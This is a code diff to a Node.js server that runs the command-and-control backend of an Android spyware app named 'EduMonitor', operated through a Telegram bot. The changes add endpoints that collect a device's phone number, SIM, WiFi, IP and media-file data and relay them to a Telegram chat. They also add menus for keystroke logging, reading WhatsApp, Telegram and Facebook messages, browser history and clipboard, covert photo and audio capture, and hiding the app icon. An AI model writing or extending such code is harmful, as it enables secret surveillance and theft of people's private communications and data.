@@ -245,7 +245,7 @@ function getNewFeaturesKeyboard() {
             { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
         ],
         [
-            { text: '📱 App Opens', callback_data: 'cmd:app_opens' },
+            { text: '📱 App Opens', callback_data: 'cmd:open_app' },
             { text: '📅 Calendar', callback_data: 'cmd:calendar' }
         ],
         [
@@ -466,7 +466,7 @@ async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
-        // CONSOLIDATED COMMAND LIST - All new consolidated commands
+        // CONSOLIDATED COMMAND LIST
         const commands = [
             // ============ CONSOLIDATED COMMANDS ============
             { command: 'help', description: '📋 Complete help menu' },
@@ -558,7 +558,16 @@ async function setChatMenuButton(chatId) {
             { command: 'target_apps', description: '📱 List target apps' },
             { command: 'small', description: '📏 Small screenshot (30%)' },
             { command: 'medium', description: '📏 Medium screenshot (70%)' },
-            { command: 'original', description: '📏 Original screenshot' }
+            { command: 'original', description: '📏 Original screenshot' },
+            
+            // ============ LEGACY COMMANDS (for backward compatibility) ============
+            { command: 'status', description: '📊 Device status' },
+            { command: 'info', description: 'ℹ️ Device info' },
+            { command: 'ip_info', description: '🌐 IP info' },
+            { command: 'wifi_info', description: '📶 WiFi info' },
+            { command: 'mobile_info', description: '📱 Mobile info' },
+            { command: 'sim_info', description: '📱 SIM info' },
+            { command: 'phone_number', description: '📞 Phone number' }
         ];
         
         await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
@@ -571,7 +580,7 @@ async function setChatMenuButton(chatId) {
             }
         });
         
-        console.log(`✅ Menu button and ${commands.length} consolidated commands set for chat ${chatId}`);
+        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
     } catch (error) {
         console.error('Error setting menu button:', error.response?.data || error.message);
     }
@@ -655,6 +664,90 @@ function formatLocationMessage(locationData) {
     } catch (error) {
         console.error('Error formatting location:', error);
         return { text: locationData };
+    }
+}
+
+function formatIPInfo(ipData) {
+    try {
+        let ipInfo = ipData;
+        if (typeof ipData === 'string') {
+            try {
+                ipInfo = JSON.parse(ipData);
+            } catch (e) {
+                return `🌐 IP Info: ${ipData}`;
+            }
+        }
+
+        let message = '🌐 <b>Network Information</b>\n\n';
+        
+        if (ipInfo.publicIP) {
+            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
+            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
+            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
+        }
+        
+        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
+            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
+        }
+        
+        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
+            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting IP info:', error);
+        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
+    }
+}
+
+function formatSimInfo(simData) {
+    try {
+        let message = '📱 <b>SIM Information</b>\n\n';
+        
+        if (Array.isArray(simData)) {
+            message += `Active SIMs: ${simData.length}\n\n`;
+            simData.forEach((sim, index) => {
+                message += `📱 <b>SIM ${index + 1}</b>\n`;
+                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
+            });
+        } else if (simData.operator) {
+            message += `• Operator: ${simData.operator}\n`;
+            message += `• Country: ${simData.country}\n`;
+            message += `• SIM State: ${simData.simState}\n`;
+            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting SIM info:', error);
+        return `📱 SIM Info: ${JSON.stringify(simData)}`;
+    }
+}
+
+function formatWifiInfo(wifiData) {
+    try {
+        let message = '📶 <b>WiFi Information</b>\n\n';
+        
+        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
+        
+        if (wifiData.connected) {
+            message += `\n📡 <b>Current Connection</b>\n`;
+            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
+            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
+            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
+            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
+            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
+            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting WiFi info:', error);
+        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
     }
 }
 
@@ -867,6 +960,10 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             case 'mobile_info':
                 caption += `📱 Mobile Info Export`;
                 break;
+            case 'screenshots':
+            case 'screenshot_logs':
+                caption += `📸 Screenshot Logs Export (${itemCount} entries)`;
+                break;
             default:
                 caption += `📎 Data Export`;
         }
@@ -892,8 +989,203 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     }
 });
 
-// ============= LOCATION ENDPOINT =============
+// ============= IP INFO ENDPOINT =============
+app.post('/api/ipinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const ipData = req.body;
+        
+        console.log(`🌐 IP Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        ipData.serverIP = getServerIP();
+        device.lastIPInfo = ipData;
+        
+        const formattedMessage = formatIPInfo(ipData);
+        
+        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
+        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ IP Info endpoint error:', error);
+        res.status(500).json({ error: 'IP Info processing failed' });
+    }
+});
 
+// ============= PHONE NUMBER ENDPOINT =============
+app.post('/api/phonenumber/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const phoneData = req.body;
+        
+        console.log(`📞 Phone number received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.phoneNumber = phoneData.phoneNumber;
+        device.simInfo = phoneData.simInfo;
+        
+        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        message += '📞 <b>Phone Information</b>\n\n';
+        
+        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
+            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
+        } else {
+            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
+        }
+        
+        if (phoneData.simInfo) {
+            if (Array.isArray(phoneData.simInfo)) {
+                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
+                phoneData.simInfo.forEach((sim, index) => {
+                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
+                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                });
+            } else {
+                message += `\n<b>SIM Information:</b>\n`;
+                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
+                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
+                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
+            }
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Phone Number endpoint error:', error);
+        res.status(500).json({ error: 'Phone Number processing failed' });
+    }
+});
+
+// ============= SIM INFO ENDPOINT =============
+app.post('/api/siminfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const simData = req.body;
+        
+        console.log(`📱 SIM Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.simInfo = simData;
+        
+        const formattedMessage = formatSimInfo(simData);
+        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ SIM Info endpoint error:', error);
+        res.status(500).json({ error: 'SIM Info processing failed' });
+    }
+});
+
+// ============= WIFI INFO ENDPOINT =============
+app.post('/api/wifiinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const wifiData = req.body;
+        
+        console.log(`📶 WiFi Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.wifiInfo = wifiData;
+        
+        const formattedMessage = formatWifiInfo(wifiData);
+        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ WiFi Info endpoint error:', error);
+        res.status(500).json({ error: 'WiFi Info processing failed' });
+    }
+});
+
+// ============= MOBILE INFO ENDPOINT =============
+app.post('/api/mobileinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const mobileData = req.body;
+        
+        console.log(`📱 Mobile Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.mobileInfo = mobileData;
+        
+        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        message += '📱 <b>Mobile Network Information</b>\n\n';
+        
+        if (mobileData.operator) {
+            message += `📶 *Network*\n`;
+            message += `• Operator: ${mobileData.operator}\n`;
+            message += `• Country: ${mobileData.country}\n`;
+            message += `• Type: ${mobileData.networkType}\n`;
+            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
+        }
+        
+        if (mobileData.ip) {
+            message += `\n🌐 *Mobile IP*\n`;
+            message += `• ${mobileData.ip}\n`;
+        }
+        
+        if (mobileData.dataEnabled !== undefined) {
+            message += `\n🔌 *Connection Status*\n`;
+            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Mobile Info endpoint error:', error);
+        res.status(500).json({ error: 'Mobile Info processing failed' });
+    }
+});
+
+// ============= LOCATION ENDPOINT =============
 app.post('/api/location/:deviceId', async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
@@ -935,6 +1227,90 @@ app.post('/api/location/:deviceId', async (req, res) => {
     } catch (error) {
         console.error('❌ Location endpoint error:', error);
         res.status(500).json({ error: 'Location processing failed' });
+    }
+});
+
+// ============= SCREENSHOT SETTINGS ENDPOINT =============
+app.post('/api/screenshot-settings/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const settingsData = req.body;
+        
+        console.log(`📸 Screenshot settings from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        device.screenshotSettings = settingsData;
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Screenshot settings error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============= RECORDING SETTINGS ENDPOINT =============
+app.post('/api/recording-settings/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const settingsData = req.body;
+        
+        console.log(`🎤 Recording settings from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        device.recordingSettings = settingsData;
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Recording settings error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============= MEDIA SCAN ENDPOINT =============
+app.post('/api/media-scan/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const scanData = req.body;
+        
+        console.log(`🔍 Media scan results from ${deviceId}:`, scanData);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        let message = `📱 *${deviceName}*\n\n`;
+        message += `🔍 *Media Scan Complete*\n\n`;
+        
+        if (scanData.files && scanData.files.length > 0) {
+            message += `Found ${scanData.files.length} media files:\n`;
+            scanData.files.slice(0, 10).forEach(file => {
+                message += `• ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)\n`;
+            });
+            if (scanData.files.length > 10) {
+                message += `... and ${scanData.files.length - 10} more\n`;
+            }
+        } else {
+            message += `No media files found.`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Media scan error:', error);
+        res.status(500).json({ error: error.message });
     }
 });
 
@@ -996,7 +1372,8 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const fileCommands = [
         'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
         'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
-        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media'
+        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media',
+        'screenshots', 'screenshot_logs'
     ];
     
     if (fileCommands.includes(command)) {
@@ -1049,7 +1426,13 @@ app.post('/api/register', async (req, res) => {
         pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
         firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
         phoneNumber: existingDevice?.phoneNumber || null,
+        lastIPInfo: existingDevice?.lastIPInfo || null,
         lastLocation: existingDevice?.lastLocation || null,
+        simInfo: existingDevice?.simInfo || null,
+        wifiInfo: existingDevice?.wifiInfo || null,
+        mobileInfo: existingDevice?.mobileInfo || null,
+        screenshotSettings: existingDevice?.screenshotSettings || null,
+        recordingSettings: existingDevice?.recordingSettings || null
     };
     
     devices.set(deviceId, deviceData);
@@ -1113,6 +1496,87 @@ app.post('/api/register', async (req, res) => {
     });
 });
 
+app.get('/api/devices', (req, res) => {
+    const deviceList = [];
+    for (const [id, device] of devices.entries()) {
+        deviceList.push({
+            deviceId: id,
+            chatId: device.chatId,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            firstSeen: new Date(device.firstSeen).toISOString(),
+            model: device.deviceInfo?.model || 'Unknown',
+            android: device.deviceInfo?.android || 'Unknown',
+            phoneNumber: device.phoneNumber || 'Not available',
+            lastIPInfo: device.lastIPInfo || null,
+            lastLocation: device.lastLocation || null,
+            autoDataRequested: autoDataRequested.has(id),
+            online: (Date.now() - device.lastSeen) < 300000
+        });
+    }
+    res.json({ total: devices.size, devices: deviceList });
+});
+
+// ============= TEST ENDPOINTS =============
+
+app.get('/test', (req, res) => {
+    const serverIP = getServerIP();
+    const userDevices = getDeviceListForUser('5326373447');
+    
+    res.send(`
+        <html>
+        <head>
+            <style>
+                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
+                h1 { color: #e94560; }
+                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
+                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
+                .online { color: #4CAF50; }
+                .offline { color: #f44336; }
+                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
+            </style>
+        </head>
+        <body>
+            <h1>✅ EduMonitor Server v6.0 Running (Consolidated Commands)</h1>
+            <div class="stats">
+                <p><b>Time:</b> ${new Date().toISOString()}</p>
+                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
+                <p><b>Total Devices:</b> ${devices.size}</p>
+                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
+                <p><b>Consolidated Commands Available:</b> 45+ (reduced from 95+)</p>
+            </div>
+            
+            <h2>📱 Registered Devices (${userDevices.length})</h2>
+            ${Array.from(devices.entries()).map(([id, device]) => {
+                const online = (Date.now() - device.lastSeen) < 300000;
+                return `
+                    <div class="device">
+                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
+                        <p><b>ID:</b> <code>${id}</code></p>
+                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
+                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
+                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
+                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
+                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
+                    </div>
+                `;
+            }).join('')}
+            
+            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
+        </body>
+        </html>
+    `);
+});
+
+app.get('/test-menu', async (req, res) => {
+    const chatId = '5326373447';
+    const result = await sendTelegramMessageWithKeyboard(
+        chatId,
+        "🎯 Test Menu - Use the buttons below:",
+        getMainMenuKeyboard(chatId)
+    );
+    res.json({ success: !!result });
+});
+
 // ============= CALLBACK QUERY HANDLER =============
 
 async function handleCallbackQuery(callbackQuery) {
@@ -1158,7 +1622,7 @@ async function handleCallbackQuery(callbackQuery) {
         return;
     }
     
-    // Handle other menu callbacks...
+    // Handle other menu callbacks
     if (data === 'help_main') {
         await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
         await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category to get started.");
@@ -1167,16 +1631,22 @@ async function handleCallbackQuery(callbackQuery) {
         await sendTelegramMessage(chatId, "🆕 *NEW FEATURES*\n\nSelect a category to explore!");
     } else if (data === 'menu_detailed_exports') {
         await editMessageKeyboard(chatId, messageId, getDetailedExportsKeyboard());
+        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details.");
     } else if (data === 'menu_file_scanner') {
         await editMessageKeyboard(chatId, messageId, getFileScannerKeyboard());
+        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools.");
     } else if (data === 'menu_data_saving') {
         await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
+        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage.");
     } else if (data === 'menu_audio_quality') {
         await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
+        await sendTelegramMessage(chatId, "🎚️ *AUDIO QUALITY SETTINGS*\n\nAdjust recording quality.");
     } else if (data === 'menu_sync_harvest') {
         await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
+        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools.");
     } else if (data === 'menu_realtime_advanced') {
         await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedKeyboard());
+        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging.");
     } else if (data === 'menu_devices') {
         const keyboard = getDeviceSelectionKeyboard(chatId);
         const userDevices = getDeviceListForUser(chatId);
@@ -1194,6 +1664,7 @@ async function handleCallbackQuery(callbackQuery) {
         }
     } else if (data === 'close_menu') {
         await editMessageKeyboard(chatId, messageId, []);
+        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
     } else if (data === 'refresh_devices') {
         const keyboard = getDeviceSelectionKeyboard(chatId);
         await editMessageKeyboard(chatId, messageId, keyboard);
@@ -1208,6 +1679,91 @@ async function handleCallbackQuery(callbackQuery) {
             message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
         });
         await sendTelegramMessage(chatId, message);
+    } else if (data === 'menu_tracking') {
+        const keyboard = [
+            [createInlineButton('📍 Location', 'cmd:location')],
+            [createInlineButton('⌨️ Keystrokes', 'cmd:keys')],
+            [createInlineButton('🔔 Notifications', 'cmd:notify')],
+            [createInlineButton('📱 App Opens', 'cmd:open_app')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_screenshot') {
+        const keyboard = [
+            [createInlineButton('📸 Take Now', 'cmd:screenshot')],
+            [createInlineButton('⚙️ Settings', 'cmd:screenshot_settings')],
+            [createInlineButton('▶️ Start Service', 'cmd:start_screenshot')],
+            [createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')],
+            [createInlineButton('📏 Small/Medium/Original', 'cmd:small')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_recording') {
+        const keyboard = [
+            [createInlineButton('🎤 Start 60s', 'cmd:start_60s_rec')],
+            [createInlineButton('⏹️ Stop 60s', 'cmd:stop_60s_rec')],
+            [createInlineButton('⚙️ Settings', 'cmd:record_info')],
+            [createInlineButton('✅ Auto ON', 'cmd:record_auto_on')],
+            [createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')],
+            [createInlineButton('🎚️ Audio Quality', 'menu_audio_quality')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_camera') {
+        const keyboard = [
+            [createInlineButton('📸 Take Photo', 'cmd:photo')],
+            [createInlineButton('🔄 Switch Camera', 'cmd:camera_switch')],
+            [createInlineButton('👤 Front Camera', 'cmd:camera_front')],
+            [createInlineButton('👥 Back Camera', 'cmd:camera_back')],
+            [createInlineButton('✅ Start Monitoring', 'cmd:camera_on')],
+            [createInlineButton('❌ Stop Monitoring', 'cmd:camera_off')],
+            [createInlineButton('📊 Camera Status', 'cmd:camera_status')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_social') {
+        const keyboard = [
+            [createInlineButton('💬 WhatsApp', 'cmd:whatsapp')],
+            [createInlineButton('💬 Telegram', 'cmd:telegram')],
+            [createInlineButton('💬 Facebook', 'cmd:facebook')],
+            [createInlineButton('🌐 Browser History', 'cmd:browser')],
+            [createInlineButton('📋 Clipboard', 'cmd:clipboard')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_media') {
+        const keyboard = [
+            [createInlineButton('🔍 Scan All', 'cmd:scan_all')],
+            [createInlineButton('🎵 Scan Media', 'cmd:scan_media')],
+            [createInlineButton('🎤 Find Recordings', 'cmd:scan_media')],
+            [createInlineButton('❓ Scan Help', 'cmd:scan_help')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_realtime') {
+        const keyboard = [
+            [createInlineButton('🔑 Keys ON', 'cmd:rt_keys_on')],
+            [createInlineButton('🔑 Keys OFF', 'cmd:rt_keys_off')],
+            [createInlineButton('🔔 Notif ON', 'cmd:rt_notif_on')],
+            [createInlineButton('🔔 Notif OFF', 'cmd:rt_notif_off')],
+            [createInlineButton('✅ All ON', 'cmd:rt_all_on')],
+            [createInlineButton('❌ All OFF', 'cmd:rt_all_off')],
+            [createInlineButton('📊 Status', 'cmd:rt_status')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+    } else if (data === 'menu_services') {
+        const keyboard = [
+            [createInlineButton('👻 Hide Icon', 'cmd:hide_icon')],
+            [createInlineButton('👁️ Show Icon', 'cmd:show_icon')],
+            [createInlineButton('🔄 Reboot Services', 'cmd:reboot_app')],
+            [createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')],
+            [createInlineButton('📊 Logs Count', 'cmd:logs_count')],
+            [createInlineButton('🔄 Sync All', 'cmd:sync_all')],
+            [createInlineButton('⚡ Force Harvest', 'cmd:force_harvest')],
+            [createInlineButton('◀️ Back', 'help_main')]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
     }
 }
 
@@ -1294,7 +1850,7 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
             break;
             
         case SCHEDULE_STATES.AWAITING_RECURRING:
-            // Handle recurring selection via callback
+            // Handled via callback
             break;
             
         case SCHEDULE_STATES.AWAITING_INTERVAL:
@@ -1333,6 +1889,48 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
 
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
+
+    // Handle /devices command
+    if (command === '/devices') {
+        const userDevices = getDeviceListForUser(chatId);
+        let message = `📱 *Your Devices*\n\n`;
+        
+        if (userDevices.length === 0) {
+            message += "No devices registered yet.";
+        } else {
+            userDevices.forEach((device, index) => {
+                const status = device.isActive ? '✅ ACTIVE' : '○';
+                message += `${index + 1}. ${status} ${device.name}\n`;
+                message += `   ID: \`${device.id}\`\n`;
+                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
+                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
+                if (device.phoneNumber !== 'Not available') {
+                    message += `   Phone: ${device.phoneNumber}\n`;
+                }
+                message += `\n`;
+            });
+            message += `\nUse /select [device_id] to switch active device.`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        return;
+    }
+
+    // Handle /select command
+    if (command.startsWith('/select ')) {
+        const deviceId = command.substring(8).trim();
+        const device = devices.get(deviceId);
+        
+        if (device && String(device.chatId) === String(chatId)) {
+            userDeviceSelection.set(chatId, deviceId);
+            await sendTelegramMessage(chatId, 
+                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
+                `ID: ${deviceId.substring(0, 8)}...`);
+        } else {
+            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
+        }
+        return;
+    }
 
     // Get selected device
     let selectedDeviceId = userDeviceSelection.get(chatId);
@@ -1391,7 +1989,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Port: ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n✅ CONSOLIDATED COMMANDS:');
+    console.log('\n✅ CONSOLIDATED COMMANDS (45+ from 95+):');
     console.log('   📋 /help - Complete help menu');
     console.log('   📱 /device_info - Complete device info');
     console.log('   🌐 /network_info - Complete network info');
@@ -1429,6 +2027,12 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   🔄 /reboot_app - Reboot services');
     console.log('   👻 /hide_icon - Hide icon');
     console.log('   👁️ /show_icon - Show icon');
-    console.log('\n🚀 TOTAL CONSOLIDATED COMMANDS: 45+');
+    console.log('   📍 /location - Get location');
+    console.log('   🔋 /battery - Battery status');
+    console.log('   💾 /storage - Storage info');
+    console.log('   🕐 /time - Current time');
+    console.log('   📸 /photo - Take photo');
+    console.log('   🔄 /camera_switch - Switch camera');
+    console.log('\n🚀 All existing features preserved (test menu, device stats, etc.)');
     console.log('🚀 ===============================================\n');
 });
